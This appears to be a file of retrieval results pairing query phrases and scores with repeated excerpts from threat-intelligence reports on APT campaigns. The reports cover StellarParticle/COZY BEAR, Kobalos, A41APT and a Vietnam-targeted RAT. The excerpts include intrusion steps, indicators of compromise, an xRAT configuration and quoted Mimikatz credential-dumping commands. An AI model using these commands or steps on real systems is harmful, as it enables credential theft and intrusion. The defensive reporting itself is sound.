the scheduled task|0.8496799626260669|"['Analyze The recipients of the document 41f0757ca4367f22b0aece325208799135c96ebe1dcafcd752d3f3c8dd4a5ccf 8.t are (at the end of the document): the deputy minister; - the units under the ministry; - police of provinces and cities directly under the central government; - Department of Inspection of Legal Documents of the Ministry of Justice; - Official Journal, Government Electronic Portal, Ministry of Public Security Portal; - Archive: VT, C06 (P1).', 'The document exploits Equation Editor starts application (CVE-201711882) to decode the 8.t in memory, after fork to install two files: C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Temp\\\\wsc.dll 4e88f8a3c3be45e0a59a8868f2b2ace51754fcdbfa9ab618e3d9d0e17831990f and C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Temp\\\\wsc_proxy.exe 1948bb0df11f768d6dd30ae7ecec5550db7c817d09cb31b5e2cee9b86a4047da The malware is a dll, it seems to be Gh0st RAT.', 'https://app.any.run/tasks/5715cfe3-2550-4808-aad0-1ea4c4fc7a88 An to start the malware, it uses a side loading technics with a scheduled Task.', 'The exe call in the entry loads dynamically wsc.dll and call the function _run@4 https://medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13cc1c906 1/45/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Side Loading Scheduled Task The RAT tries to connect to nicetiss54.lflink.com|185.216.35.11.', 'https://medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13cc1c906 2/45/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Threat Intelligence Consideration We have the same TTps and victimology like Goblin Panda: Officials Vietnameses Side Loading 8.t RTF kit exploit a dynamic dns name But the payload has changed and the launch of the backdoor has changed.', 'Its used a scheduled task.', 'Usually this group uses NewCoreRat.', 'IOCs Main object- 41f0757ca4367f22b0aece325208799135c96ebe1dcafcd752d3f3c8dd4a5ccf sha256 41f0757ca4367f22b0aece325208799135c96ebe1dcafcd752d3f3c8dd4a5ccf sha1 6e670a837970a1fb4161d77d5f720d318d7e4dbc md5 f34514118eb4689560cd6c0c654f26d9 Dropped executable file sha256 C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Temp\\\\wsc.dll 4e88f8a3c3be45e0a59a8868f2b2ace51754fcdbfa9ab618e3d9d0e17831990f sha256 C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Temp\\\\wsc_proxy.exe 1948bb0df11f768d6dd30ae7ecec5550db7c817d09cb31b5e2cee9b86a4047da https://medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13cc1c906 3/45/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese DNS requests domain nicetiss54.lflink.com Connections ip 185.216.35.11 https://medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13cc1c906 4/4']"
Decrypted strings|0.9220654118144735|['ESET Research White Paper // January 2021 TLP: WHITE A WILD KOBALOS APPEARS Tricksy Linux malware goes after HPCs Marc-Etienne M.Lveill Ignacio SanmillanTABLE OF CONTENTS 1.', 'Executive summary .', '.', '.', '.', '.', '.', '.']
the malicious authentications into victim O365 tenants had originated from within the victim’s own network.|0.7551979557874352|['Throughout 2020, an operation attributed to the Foreign Intelligence Service of the Russian Federation (SVR) by the U.S. government was conducted to gain access to the update mechanism of the SolarWinds IT management software and use it to broaden their intelligence collection capabilities.', 'This activity is tracked by CrowdStrike as the StellarParticle campaign and is associated with the COZY BEAR adversary group.', '1/21This blog discusses the novel tactics and techniques leveraged in StellarParticle investigations conducted by CrowdStrike.', 'These techniques include: Credential hopping for obscuring lateral movement Office 365 (O365) Service Principal and Application hijacking, impersonation and manipulation Stealing browser cookies for bypassing multifactor authentication Use of the TrailBlazer implant and the Linux variant of GoldMax malware Credential theft using Get-ADReplAccount Credential Hopping The majority of StellarParticle-related investigations conducted by CrowdStrike have started with the identification of adversary actions within a victims O365 environment.', 'This has been advantageous to CrowdStrike incident responders in that, through investigating victim O365 environments, they could gain an accurate accounting of time, account and source IP address of adversary victimization of the O365 tenant.', 'In multiple engagements, this led CrowdStrike incident responders to identify that the malicious authentications into victim O365 tenants had originated from within the victims own network.', 'Armed with this information, CrowdStrike investigators were able to identify from which systems in these internal networks the threat actor was making authentications to O365.', 'These authentications would typically occur from servers in the environment, leading to natural investigative questions: Why would a user authenticate into O365 from a domain controller or other infrastructure server?', 'What credentials were used as part of the session from which the O365 authentication occurred?', 'This led our responders to identify the occurrence of credential hopping, where the threat actor leveraged different credentials for each step while moving laterally through the victims network.', 'While this particular technique is not necessarily unique to the StellarParticle campaign, it indicates a more advanced threat actor and may go unnoticed by a victim.']
the malicious authentications into victim O365 tenants had originated from within the victim’s own network.|0.7551979557874352|['Throughout 2020, an operation attributed to the Foreign Intelligence Service of the Russian Federation (SVR) by the U.S. government was conducted to gain access to the update mechanism of the SolarWinds IT management software and use it to broaden their intelligence collection capabilities.', 'This activity is tracked by CrowdStrike as the StellarParticle campaign and is associated with the COZY BEAR adversary group.', '1/21This blog discusses the novel tactics and techniques leveraged in StellarParticle investigations conducted by CrowdStrike.', 'These techniques include: Credential hopping for obscuring lateral movement Office 365 (O365) Service Principal and Application hijacking, impersonation and manipulation Stealing browser cookies for bypassing multifactor authentication Use of the TrailBlazer implant and the Linux variant of GoldMax malware Credential theft using Get-ADReplAccount Credential Hopping The majority of StellarParticle-related investigations conducted by CrowdStrike have started with the identification of adversary actions within a victims O365 environment.', 'This has been advantageous to CrowdStrike incident responders in that, through investigating victim O365 environments, they could gain an accurate accounting of time, account and source IP address of adversary victimization of the O365 tenant.', 'In multiple engagements, this led CrowdStrike incident responders to identify that the malicious authentications into victim O365 tenants had originated from within the victims own network.', 'Armed with this information, CrowdStrike investigators were able to identify from which systems in these internal networks the threat actor was making authentications to O365.', 'These authentications would typically occur from servers in the environment, leading to natural investigative questions: Why would a user authenticate into O365 from a domain controller or other infrastructure server?', 'What credentials were used as part of the session from which the O365 authentication occurred?', 'This led our responders to identify the occurrence of credential hopping, where the threat actor leveraged different credentials for each step while moving laterally through the victims network.', 'While this particular technique is not necessarily unique to the StellarParticle campaign, it indicates a more advanced threat actor and may go unnoticed by a victim.']
Log in to O365 as a user with privileged access to cloud resources.|1.0000000000000002|['This led our responders to identify the occurrence of credential hopping, where the threat actor leveraged different credentials for each step while moving laterally through the victims network.', 'While this particular technique is not necessarily unique to the StellarParticle campaign, it indicates a more advanced threat actor and may go unnoticed by a victim.', 'Below is an example of how a threat actor performs credential hopping: Gain access to the victims network by logging into a public-facing system via Secure Shell (SSH) using a local account <user sftp> acquired during previous credential theft activities.', 'Use port forwarding capabilities built into SSH on the public-facing system to establish a Remote Desktop Protocol (RDP) session to an internal server (Server 1) using a domain service account.', 'From Server 1, establish another RDP session to a different internal server (Server 2) using a domain administrators account.', 'Log in to O365 as a user with privileged access to cloud resources.', '2/21Figure 1.', 'Example of credential hopping technique This technique could be hard to identify in environments where defenders have little visibility into identity usage.', 'In the example shown in Figure 1, the threat actor leveraged a service interactively, which should generate detections for defenders to investigate.', 'However, the threat actor could have easily used a second domain administrator account or any other combination of accounts that would not be easily detected.', 'A solution such as CrowdStrike Falcon Identity Threat Detection would help identify these anomalous logons and especially infrequent destinations for accounts.']
Log in to O365 as a user with privileged access to cloud resources.|1.0000000000000002|['This led our responders to identify the occurrence of credential hopping, where the threat actor leveraged different credentials for each step while moving laterally through the victims network.', 'While this particular technique is not necessarily unique to the StellarParticle campaign, it indicates a more advanced threat actor and may go unnoticed by a victim.', 'Below is an example of how a threat actor performs credential hopping: Gain access to the victims network by logging into a public-facing system via Secure Shell (SSH) using a local account <user sftp> acquired during previous credential theft activities.', 'Use port forwarding capabilities built into SSH on the public-facing system to establish a Remote Desktop Protocol (RDP) session to an internal server (Server 1) using a domain service account.', 'From Server 1, establish another RDP session to a different internal server (Server 2) using a domain administrators account.', 'Log in to O365 as a user with privileged access to cloud resources.', '2/21Figure 1.', 'Example of credential hopping technique This technique could be hard to identify in environments where defenders have little visibility into identity usage.', 'In the example shown in Figure 1, the threat actor leveraged a service interactively, which should generate detections for defenders to investigate.', 'However, the threat actor could have easily used a second domain administrator account or any other combination of accounts that would not be easily detected.', 'A solution such as CrowdStrike Falcon Identity Threat Detection would help identify these anomalous logons and especially infrequent destinations for accounts.']
This threat actor abused access to accounts in the Cloud Solution Partner’s environment with legitimate delegated administrative privileges to then gain access to several customers’ O365 environments|0.9396369444491933|['By examining RDP Bitmap Cache files, CrowdStrike was able to demonstrate that the threat actor had opened Chrome and exported all of the users saved passwords as plaintext in a CSV file during these sessions.', '4/21Figure 4.', 'RDP Bitmap Cache reconstruction showing exportation of Chrome passwords In addition, the threat actor visited sensitive websites that the user had access to, which in one instance allowed them to browse and download a victims customer list.', 'After this, the threat actor navigated to the users Chrome history page and deleted the specific history items related to threat actor activity, leaving the rest of the users Chrome history intact.', 'O365 Delegated Administrator Abuse CrowdStrike also identified a connection between StellarParticle-related campaigns and the abuse of Microsoft Cloud Solution Partners O365 tenants.', 'This threat actor abused access to accounts in the Cloud Solution Partners environment with legitimate delegated administrative privileges to then gain access to several customers O365 environments.', 'By analyzing Azure AD sign-ins, CrowdStrike was able to use known indicators of compromise (IOCs) to identify several threat actor logins to customer environments.', 'These cross-tenant sign-ins were identified by looking for values in the resourceTenantId attribute that did not match the Cloud Solution Partners own Azure tenant ID.', 'CrowdStrike also identified a limitation within Microsofts Delegated Administration capabilities for Microsoft Cloud Solution Partners.', 'While a normal O365 administrator can be provided dozens of specific administrative roles to limit the privileges granted, this same degree of customization cannot be applied to Microsoft Cloud Solution Partners that use the delegated administrator functionality in O365.', 'For Microsoft Cloud Solution Partners, there are only two substantial administrative options today when managing a customers environment, Admin agent or Helpdesk agent .2 The Helpdesk agent role provides very limited access that is equivalent to a password admin role, whereas the Admin agent role provides broad access more equivalent to global administrator.']
This threat actor abused access to accounts in the Cloud Solution Partner’s environment with legitimate delegated administrative privileges to then gain access to several customers’ O365 environments|0.9396369444491933|['By examining RDP Bitmap Cache files, CrowdStrike was able to demonstrate that the threat actor had opened Chrome and exported all of the users saved passwords as plaintext in a CSV file during these sessions.', '4/21Figure 4.', 'RDP Bitmap Cache reconstruction showing exportation of Chrome passwords In addition, the threat actor visited sensitive websites that the user had access to, which in one instance allowed them to browse and download a victims customer list.', 'After this, the threat actor navigated to the users Chrome history page and deleted the specific history items related to threat actor activity, leaving the rest of the users Chrome history intact.', 'O365 Delegated Administrator Abuse CrowdStrike also identified a connection between StellarParticle-related campaigns and the abuse of Microsoft Cloud Solution Partners O365 tenants.', 'This threat actor abused access to accounts in the Cloud Solution Partners environment with legitimate delegated administrative privileges to then gain access to several customers O365 environments.', 'By analyzing Azure AD sign-ins, CrowdStrike was able to use known indicators of compromise (IOCs) to identify several threat actor logins to customer environments.', 'These cross-tenant sign-ins were identified by looking for values in the resourceTenantId attribute that did not match the Cloud Solution Partners own Azure tenant ID.', 'CrowdStrike also identified a limitation within Microsofts Delegated Administration capabilities for Microsoft Cloud Solution Partners.', 'While a normal O365 administrator can be provided dozens of specific administrative roles to limit the privileges granted, this same degree of customization cannot be applied to Microsoft Cloud Solution Partners that use the delegated administrator functionality in O365.', 'For Microsoft Cloud Solution Partners, there are only two substantial administrative options today when managing a customers environment, Admin agent or Helpdesk agent .2 The Helpdesk agent role provides very limited access that is equivalent to a password admin role, whereas the Admin agent role provides broad access more equivalent to global administrator.']
using privileged accounts and then accessed the wiki using a different set of credentials.|0.7716595444424138|['While operating in the victims internal network, the threat actor accessed sensitive information specific to the products and services that the victim organization provided.', 'This information included items such as product/service architecture and design documents, vulnerabilities and step-by-step instructions to perform various tasks.', 'Additionally, the threat actor viewed pages related to internal business operations such as development schedules and points of contact.', 'In some instances these points of contact were subsequently targeted for further data collection.', 'The threat actors wiki access could be considered an extension of Credential Hopping described earlier.', 'The threat actor established RDP sessions to internal servers using privileged accounts and then accessed the wiki using a different set of credentials.', '8/21CrowdStrike observed the threat actor accessing the wiki as users who would be considered non-privileged from an Active Directory perspective but had access to sensitive data specific to the victims products or services.', 'At this time, the malicious access of internal wikis is an information gathering technique that CrowdStrike has only observed in StellarParticle investigations.', 'CrowdStrike was able to identify the wiki access primarily through forensic analysis of the internal systems used by the threat actor.', 'Given the threat actors penchant for clearing browser data, organizations should not rely upon the availability of these artifacts for future investigations.', 'CrowdStrike recommends the following best practices for internal information repositories: Enable detailed access logging Ensure logs are centralized and stored for at least 180 days Create detections for anomalous activity such as access from an unusual location like a server subnet Enable MFA on the repository site, or provide access via Single Sign On (SSO) behind MFA O365 Built-in Service Principal Hijacking The threat actor connected via Remote Desktop from a Domain Controller to a vCenter server and opened a PowerShell console, then used the PowerShell command -ep bypass to circumvent the execution policy.']
using privileged accounts and then accessed the wiki using a different set of credentials.|0.7716595444424138|['While operating in the victims internal network, the threat actor accessed sensitive information specific to the products and services that the victim organization provided.', 'This information included items such as product/service architecture and design documents, vulnerabilities and step-by-step instructions to perform various tasks.', 'Additionally, the threat actor viewed pages related to internal business operations such as development schedules and points of contact.', 'In some instances these points of contact were subsequently targeted for further data collection.', 'The threat actors wiki access could be considered an extension of Credential Hopping described earlier.', 'The threat actor established RDP sessions to internal servers using privileged accounts and then accessed the wiki using a different set of credentials.', '8/21CrowdStrike observed the threat actor accessing the wiki as users who would be considered non-privileged from an Active Directory perspective but had access to sensitive data specific to the victims products or services.', 'At this time, the malicious access of internal wikis is an information gathering technique that CrowdStrike has only observed in StellarParticle investigations.', 'CrowdStrike was able to identify the wiki access primarily through forensic analysis of the internal systems used by the threat actor.', 'Given the threat actors penchant for clearing browser data, organizations should not rely upon the availability of these artifacts for future investigations.', 'CrowdStrike recommends the following best practices for internal information repositories: Enable detailed access logging Ensure logs are centralized and stored for at least 180 days Create detections for anomalous activity such as access from an unusual location like a server subnet Enable MFA on the repository site, or provide access via Single Sign On (SSO) behind MFA O365 Built-in Service Principal Hijacking The threat actor connected via Remote Desktop from a Domain Controller to a vCenter server and opened a PowerShell console, then used the PowerShell command -ep bypass to circumvent the execution policy.']
threat actor had knowledge of these accounts and used them on the correct systems|0.8117796903139581|['FTP Scanning/Identity Knowledge In one instance, after being evicted from a victim environment, the threat actor began probing external services as a means to regain access, initially focusing on (S)FTP servers that were internet-accessible.', 'Logs on the servers indicated that the threat actor attempted to log in with multiple valid accounts and in several cases was successful.', 'There was little to no activity during the (S)FTP sessions.', 'This likely was an exercise in attempting to identify misconfigured (S)FTP accounts that also had shell access, similar to whats described in the Credential Hopping section earlier.', 'Some of the accounts used were not in the victims Active Directory, as these were accounts for customers of the victim and stored in a separate LDAP database.', 'However, the threat actor had knowledge of these accounts and used them on the correct systems, which further confirmed that the threat actor had advanced knowledge of the victims environment.', 'After confirming the FTP accounts did not provide shell access into the environment, the threat actor began attempting to connect into the environment via VPN.', 'The threat actor attempted to log in to the VPN using several user accounts but was prevented from connecting, either due to not having the correct password, or due to having the correct password but not getting past the recently implemented MFA requirement.', 'Eventually, the threat actor attempted an account that they had the correct password for but that had not been set up with MFA.', 'This resulted in a prompt being displayed to the threat actor that included an MFA setup link.', 'The threat actor subsequently set up MFA for the account and successfully connected to the victims network via VPN.']
threat actor had knowledge of these accounts and used them on the correct systems|0.8117796903139581|['FTP Scanning/Identity Knowledge In one instance, after being evicted from a victim environment, the threat actor began probing external services as a means to regain access, initially focusing on (S)FTP servers that were internet-accessible.', 'Logs on the servers indicated that the threat actor attempted to log in with multiple valid accounts and in several cases was successful.', 'There was little to no activity during the (S)FTP sessions.', 'This likely was an exercise in attempting to identify misconfigured (S)FTP accounts that also had shell access, similar to whats described in the Credential Hopping section earlier.', 'Some of the accounts used were not in the victims Active Directory, as these were accounts for customers of the victim and stored in a separate LDAP database.', 'However, the threat actor had knowledge of these accounts and used them on the correct systems, which further confirmed that the threat actor had advanced knowledge of the victims environment.', 'After confirming the FTP accounts did not provide shell access into the environment, the threat actor began attempting to connect into the environment via VPN.', 'The threat actor attempted to log in to the VPN using several user accounts but was prevented from connecting, either due to not having the correct password, or due to having the correct password but not getting past the recently implemented MFA requirement.', 'Eventually, the threat actor attempted an account that they had the correct password for but that had not been set up with MFA.', 'This resulted in a prompt being displayed to the threat actor that included an MFA setup link.', 'The threat actor subsequently set up MFA for the account and successfully connected to the victims network via VPN.']
The Threat actor also used valid accounts to create persistence within the environment|0.923767034381219|['Unfortunately, this check only applies when a user is changing their password via the password change method but if a password reset is performed (changing the password without knowing the previous password), this check is bypassed for an administrative user or a Windows account that has the Reset Password permission on a 17/21users account object.12 Since the Get-ADReplAccount cmdlet described above included the NTHashHistory values (i.e., previous password hashes) for user accounts, CrowdStrike was able to verify that some administrative accounts indeed had the exact same password hash showing up multiple times in the password history, as well as in the current NTHash value.', 'Close Out The StellarParticle campaign, associated with the COZY BEAR adversary group, demonstrates this threat actors extensive knowledge of Windows and Linux operating systems, Microsoft Azure, O365, and Active Directory, and their patience and covert skill set to stay undetected for months and in some cases, years.', 'A special thank you to the CrowdStrike Incident Response and CrowdStrike Intelligence teams for helping make this blog possible, especially Ryan McCombs, Ian Barton, Patrick Bennet, Alex Parsons, Christopher Romano, Jackson Roussin and Tom Goldsmith.', 'Endnotes MITRE ATT&CK Framework The following table maps TTPs covered in this article to the MITRE ATT&CK framework.', 'Tactic Technique Observable Credential T1003.006 OS The threat actor obtained Active Directory credentials Access Credential through domain replication protocols using the Get- Dumping: ADReplAccount command from DSInternals DCSync Credential T1003.001: OS The threat actor used a heavily obfuscated PowerShell Access Credential script to execute the Mimikatz commands Dumping: privilege::debug sekurlsa::logonpasswords LSASS lsadump::lsa /patch in-memory and encrypt the Memory output Initial Access / T1078.003: A local account was used by the Threat Actor to Persistence Valid Accounts: establish a SSH tunnel into the internal network Local Accounts environment Initial Access / T1133: The threat actor used VPNs to gain access to systems Persistence External and persist in the environment Remote Services Credential T1555.003: The threat actor exported saved passwords from Access Credentials users Chrome browser installations from Password Stores: Credentials from Web Browsers 18/21Credential T1539: Steal The threat actor stole web session cookies from end Access Web Session user workstations and used them to access cloud Cookie resources Lateral T1021.001: The threat actor used both privileged and non- Movement Remote privileged accounts for RDP throughout the Services: environment, depending on the target system Remote Desktop Protocol Initial Access, T1078.004: The threat actor used accounts with Delegated Persistence Valid Accounts: Administrator rights to access other O365 tenants.', 'The Cloud Threat actor also used valid accounts to create Accounts persistence within the environment.', 'Persistence T1546.003: TrailBlazer was configured to execute after a reboot Event via a command-line event consumer Triggered Execution: Windows Management Instrumentation Event Subscription Defense T1036.005: The threat actor renamed their utilities to masquerade Evasion Masquerading: as legitimate system binaries (AdFind as svchost.exe), Match match the systems role (GoldMax), or appear Legitimate legitimate (TrailBlazer as an apparent Adobe utility).', 'Name or Additionally, the threat actor renamed their systems Location prior to connecting to victims VPNs to match the victims system naming convention Discovery T1087.002: The threat actor used AdFind, standard PowerShell Account cmdlets, and custom tooling to identify various pieces Discovery: of information from Active Directory Domain Account T1482: Domain Trust Discovery T1069.002: Permission Groups Discovery: Domain Groups Defense T1550.001: The threat actor used compromised service principals Evasion / Use Alternate to make changes to the Office 365 environment.', 'Lateral Authentication Movement Material: Application Access Token 19/21Collection T1213.', ': Data The threat actor accessed data from Information from Repositories Information Repositories: Persistence T1098.001: The threat actor added credentials to O365 Service Account Principals Manipulation: Additional Cloud Credentials Persistence T1078.004: The threat actor created new O365 Service Principals Valid Accounts: to maintain access to victims environments Cloud Accounts Discovery T1057: The threat actor regularly interrogated other systems Process using tasklist.exe Discovery Reconnaissance T1595.001: The threat actor probed external services in an attempt Active to regain access to the environment Scanning: Scanning IP Blocks Indicators of Compromise (IOCs) Indicator Details http://satkas.waw[.', ']pl/rainloop/forecast TrailBlazer C2 1326932d63485e299ba8e03bfcd23057f7897c3ae0d26ed1235c4fb108adb105 TrailBlazer SHA256 vm-srv-1.gel.ulaval.ca GoldMax C2 2a3b660e19b56dad92ba45dd164d300e9bd9c3b17736004878f45ee23a0177ac GoldMax SHA256 156.96.46.116 TA Infrastructure 188.34.185.85 TA Infrastructure 212.103.61.74 TA Infrastructure 192.154.224.126 TA Infrastructure 23.29.115.180 TA Infrastructure 20/21104.237.218.74 TA Infrastructure 23.82.128.144 TA Infrastructure 21/21']
The Threat actor also used valid accounts to create persistence within the environment|0.923767034381219|['Unfortunately, this check only applies when a user is changing their password via the password change method but if a password reset is performed (changing the password without knowing the previous password), this check is bypassed for an administrative user or a Windows account that has the Reset Password permission on a 17/21users account object.12 Since the Get-ADReplAccount cmdlet described above included the NTHashHistory values (i.e., previous password hashes) for user accounts, CrowdStrike was able to verify that some administrative accounts indeed had the exact same password hash showing up multiple times in the password history, as well as in the current NTHash value.', 'Close Out The StellarParticle campaign, associated with the COZY BEAR adversary group, demonstrates this threat actors extensive knowledge of Windows and Linux operating systems, Microsoft Azure, O365, and Active Directory, and their patience and covert skill set to stay undetected for months and in some cases, years.', 'A special thank you to the CrowdStrike Incident Response and CrowdStrike Intelligence teams for helping make this blog possible, especially Ryan McCombs, Ian Barton, Patrick Bennet, Alex Parsons, Christopher Romano, Jackson Roussin and Tom Goldsmith.', 'Endnotes MITRE ATT&CK Framework The following table maps TTPs covered in this article to the MITRE ATT&CK framework.', 'Tactic Technique Observable Credential T1003.006 OS The threat actor obtained Active Directory credentials Access Credential through domain replication protocols using the Get- Dumping: ADReplAccount command from DSInternals DCSync Credential T1003.001: OS The threat actor used a heavily obfuscated PowerShell Access Credential script to execute the Mimikatz commands Dumping: privilege::debug sekurlsa::logonpasswords LSASS lsadump::lsa /patch in-memory and encrypt the Memory output Initial Access / T1078.003: A local account was used by the Threat Actor to Persistence Valid Accounts: establish a SSH tunnel into the internal network Local Accounts environment Initial Access / T1133: The threat actor used VPNs to gain access to systems Persistence External and persist in the environment Remote Services Credential T1555.003: The threat actor exported saved passwords from Access Credentials users Chrome browser installations from Password Stores: Credentials from Web Browsers 18/21Credential T1539: Steal The threat actor stole web session cookies from end Access Web Session user workstations and used them to access cloud Cookie resources Lateral T1021.001: The threat actor used both privileged and non- Movement Remote privileged accounts for RDP throughout the Services: environment, depending on the target system Remote Desktop Protocol Initial Access, T1078.004: The threat actor used accounts with Delegated Persistence Valid Accounts: Administrator rights to access other O365 tenants.', 'The Cloud Threat actor also used valid accounts to create Accounts persistence within the environment.', 'Persistence T1546.003: TrailBlazer was configured to execute after a reboot Event via a command-line event consumer Triggered Execution: Windows Management Instrumentation Event Subscription Defense T1036.005: The threat actor renamed their utilities to masquerade Evasion Masquerading: as legitimate system binaries (AdFind as svchost.exe), Match match the systems role (GoldMax), or appear Legitimate legitimate (TrailBlazer as an apparent Adobe utility).', 'Name or Additionally, the threat actor renamed their systems Location prior to connecting to victims VPNs to match the victims system naming convention Discovery T1087.002: The threat actor used AdFind, standard PowerShell Account cmdlets, and custom tooling to identify various pieces Discovery: of information from Active Directory Domain Account T1482: Domain Trust Discovery T1069.002: Permission Groups Discovery: Domain Groups Defense T1550.001: The threat actor used compromised service principals Evasion / Use Alternate to make changes to the Office 365 environment.', 'Lateral Authentication Movement Material: Application Access Token 19/21Collection T1213.', ': Data The threat actor accessed data from Information from Repositories Information Repositories: Persistence T1098.001: The threat actor added credentials to O365 Service Account Principals Manipulation: Additional Cloud Credentials Persistence T1078.004: The threat actor created new O365 Service Principals Valid Accounts: to maintain access to victims environments Cloud Accounts Discovery T1057: The threat actor regularly interrogated other systems Process using tasklist.exe Discovery Reconnaissance T1595.001: The threat actor probed external services in an attempt Active to regain access to the environment Scanning: Scanning IP Blocks Indicators of Compromise (IOCs) Indicator Details http://satkas.waw[.', ']pl/rainloop/forecast TrailBlazer C2 1326932d63485e299ba8e03bfcd23057f7897c3ae0d26ed1235c4fb108adb105 TrailBlazer SHA256 vm-srv-1.gel.ulaval.ca GoldMax C2 2a3b660e19b56dad92ba45dd164d300e9bd9c3b17736004878f45ee23a0177ac GoldMax SHA256 156.96.46.116 TA Infrastructure 188.34.185.85 TA Infrastructure 212.103.61.74 TA Infrastructure 192.154.224.126 TA Infrastructure 23.29.115.180 TA Infrastructure 20/21104.237.218.74 TA Infrastructure 23.82.128.144 TA Infrastructure Additional Resources Read about the latest trends in threat hunting and more in the 2021 Threat Hunting Report or simply download the report now.']
establish another RDP session to a different internal server|0.7853770286007424|['What credentials were used as part of the session from which the O365 authentication occurred?', 'This led our responders to identify the occurrence of credential hopping, where the threat actor leveraged different credentials for each step while moving laterally through the victims network.', 'While this particular technique is not necessarily unique to the StellarParticle campaign, it indicates a more advanced threat actor and may go unnoticed by a victim.', 'Below is an example of how a threat actor performs credential hopping: Gain access to the victims network by logging into a public-facing system via Secure Shell (SSH) using a local account <user sftp> acquired during previous credential theft activities.', 'Use port forwarding capabilities built into SSH on the public-facing system to establish a Remote Desktop Protocol (RDP) session to an internal server (Server 1) using a domain service account.', 'From Server 1, establish another RDP session to a different internal server (Server 2) using a domain administrators account.', 'Log in to O365 as a user with privileged access to cloud resources.', '2/21Figure 1.', 'Example of credential hopping technique This technique could be hard to identify in environments where defenders have little visibility into identity usage.', 'In the example shown in Figure 1, the threat actor leveraged a service interactively, which should generate detections for defenders to investigate.', 'However, the threat actor could have easily used a second domain administrator account or any other combination of accounts that would not be easily detected.']
establish another RDP session to a different internal server|0.7853770286007424|['What credentials were used as part of the session from which the O365 authentication occurred?', 'This led our responders to identify the occurrence of credential hopping, where the threat actor leveraged different credentials for each step while moving laterally through the victims network.', 'While this particular technique is not necessarily unique to the StellarParticle campaign, it indicates a more advanced threat actor and may go unnoticed by a victim.', 'Below is an example of how a threat actor performs credential hopping: Gain access to the victims network by logging into a public-facing system via Secure Shell (SSH) using a local account <user sftp> acquired during previous credential theft activities.', 'Use port forwarding capabilities built into SSH on the public-facing system to establish a Remote Desktop Protocol (RDP) session to an internal server (Server 1) using a domain service account.', 'From Server 1, establish another RDP session to a different internal server (Server 2) using a domain administrators account.', 'Log in to O365 as a user with privileged access to cloud resources.', '2/21Figure 1.', 'Example of credential hopping technique This technique could be hard to identify in environments where defenders have little visibility into identity usage.', 'In the example shown in Figure 1, the threat actor leveraged a service interactively, which should generate detections for defenders to investigate.', 'However, the threat actor could have easily used a second domain administrator account or any other combination of accounts that would not be easily detected.']
using a domain administrator’s account.|0.8142785241751904|"['Not Not 309 Creating thread for executing downloaded shellcode was implemented from P8RAT which was built on 2020-12-14.', 'Enable implemented implemented 20FYAntiLoader Aka.', ""DILLJUICE stage2 One of DESLoader's payloads Fileless type multi-layer loader module Provocative Export function name Loads .NET Loader using CppHostCLR Contains .NET Loader packed with ConfuserEx v1.0.0 Finally, Payload is xRAT (QuasarRAT) 21Example of FYAntiLoader's payload loading flow reflective fileless implants side-loading load decrypt dll injection FYAnti usoclient.exe CCFIPC64.dll msftedit.prf.coo shellcode1 embedded DLL1 Legitimate EXE Layer I Layer II Layer III load reflective decrypt dll injection CppHostCLR load decrypt msdtcuiu.adi.wdb shellcode2 embedded DLL2 .NET loader web_lowtrust.config.uninstall xRAT Layer IV FYAnti Looking for specific directory and search file with condition, then read file and decrypt payload 22xRAT (payload of FYAntiLoader) VERSION 2.0.0.0 HOSTS 45.138.157.83:443; RECONNECTDELAY 1846872 KEY [redacted] AUTHKEY [redacted] DIRECTORY Environment.SpecialFolder.ApplicationData SUBDIRECTORY Subdir INSTALLNAME Client.exe INSTALL false STARTUP false MUTEX 3n5HUTePmoGqIF8CZanamdGw STARTUPKEY Quasar Client Startup HIDEFILE false ENABLELOGGER false ENCRYPTIONKEY KCYcz6PCYZ2VSiFyu2GU TAG [redacted] LOGDIRECTORYNAME Logs HIDEDIRECTORY false Obfuscated configuration data decrypts HIDEINSTALLSUBDIRECTOR false using base64 + AES CFB mode download_url none 23Characteristics of IntrusionIntrusion method in A41APT campaign Internal Recon."", 'Persistence of C2 Initial Intrusion Trace Removal Lateral Movement malware Communication Penetration via SSL-VPN Perform a port scan to search Persistence by scheduled task Communicate with C2 server Delete the event log after using vulnerabilities or stolen for open RDP or SMB port.', 'registration to execute the via DESLoaders payload or communication with C2 is credentials Then, connect to RDP with an legitimate PE PowerShell remoting finished.', 'administrator account.', 'Scheduled task registration Event log deletion C2 Server Server* In Memory Server    DESLoader OR Payload PowerShell AD Server Laptop Legitimate PE Credential Dumping 25 *We have also observed cases where traces have been removed from other compromised servers as well.Characteristics of Compromise 1.', 'Initial intrusion using SSL-VPN products 2.', 'Network scanning and credential theft 3.', 'PowerShell remoting to remove event logs 4.', 'Persistence of malware by scheduled task 26- Initial intrusion via SSL-VPN (e.g.']"
a given user account was also authenticating to Active Directory from a given source IP address two years prior|0.8768112017520072|['One of the most useful roles recorded by UAL is the File Server role, which includes SMB access, though other role types can also be very helpful.', 'An overview of UAL, what information it contains and how it can be leveraged in forensic investigations can be found here.', 'In multiple StellarParticle-related cases, because the threat actor used the same set of accounts during their operations in the environment, CrowdStrike was able to identify previous malicious activity going back multiple years, based solely on UAL data.', 'Even though its only available on Server 2012 and up, UAL can still be used to trace evidence of threat actor activity on legacy systems as long as the activity on the legacy system involves some (deliberate or unintentional) access to a 2012+ system.', 'For example, in addition to tracking SMB activity, UAL databases on Domain Controllers track Active Directory access.', 'This allowed CrowdStrike to demonstrate that a given user account was also authenticating to Active Directory from a given source IP address two years prior.', 'Because the user account was known to have recently been abused by the threat actor, and the source IP of the system in question was not one that account would typically be active on, the investigation led to the source system and ultimately resulted in the timeline of malicious activity being pushed back by years, with additional compromised systems even being discovered still running unique malware from that time period.', 'TrailBlazer and GoldMax Throughout StellarParticle-related investigations, CrowdStrike has identified two sophisticated malware families that were placed on victim systems in the mid-2019 timeframe: a Linux variant of GoldMax and a completely new family CrowdStrike refers to as TrailBlazer.', 'TrailBlazer Attempted to blend in with a file name that matched the system name it resided on Configured for WMI persistence (generally uncommon in 2019) Used likely compromised infrastructure for C2 Masquerades its command-and-control (C2) traffic as legitimate Google Notifications 